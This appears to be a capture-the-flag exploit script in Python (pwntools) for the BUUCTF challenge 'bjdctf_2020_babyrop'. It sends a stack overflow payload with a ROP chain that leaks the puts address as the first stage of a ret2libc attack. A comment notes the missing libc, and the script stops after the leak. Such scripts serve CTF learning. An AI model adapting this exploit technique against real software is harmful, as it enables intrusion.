#Made by fly_autumn
#x64 ret2libc
from pwn import *
p = process("./bjdctf_2020_babyrop")
elf = ELF("./bjdctf_2020_babyrop")
context(os="linux",arch="amd64")

offset = 40
pop_rdi = 0x400733
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
vuln_plt = 0x40067d
payload = b"\x00" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_plt)
p.recvuntil(b"story!\n")
p.sendline(payload)
puts_addr = u64(p.recv(6).ljust(8,b"\0"))
log.success("puts addr: "+hex(puts_addr))
#你BUUCTF依旧不给libc,依旧做不起

p.interactive()
